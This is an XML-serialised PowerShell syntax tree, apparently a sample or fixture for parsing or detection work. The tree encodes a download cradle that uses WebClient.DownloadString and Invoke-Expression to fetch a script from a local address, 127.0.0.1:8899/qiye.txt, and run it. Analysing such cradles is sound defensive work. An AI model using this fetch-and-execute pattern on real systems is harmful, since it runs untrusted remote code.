<?xml version="1.0" encoding="utf-8"?>
<ScriptBlockAst>
  <Attributes />
  <UsingStatements />
  <NamedBlockAst>
    <Statements>
      <PipelineAst>
        <PipelineElements>
          <CommandAst>
            <CommandElements>
              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke-Expression</StringConstantExpressionAst>
              <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
                <Arguments>
                  <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">http://127.0.0.1:8899/qiye.txt</StringConstantExpressionAst>
                </Arguments>
                <ParenExpressionAst StaticType="System.Object">
                  <PipelineAst>
                    <PipelineElements>
                      <CommandAst>
                        <CommandElements>
                          <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">New-Object</StringConstantExpressionAst>
                          <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">System.Net.WebClient</StringConstantExpressionAst>
                        </CommandElements>
                        <Redirections />
                      </CommandAst>
                    </PipelineElements>
                  </PipelineAst>
                </ParenExpressionAst>
                <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">DownloadString</StringConstantExpressionAst>
              </InvokeMemberExpressionAst>
            </CommandElements>
            <Redirections />
          </CommandAst>
        </PipelineElements>
      </PipelineAst>
    </Statements>
  </NamedBlockAst>
</ScriptBlockAst>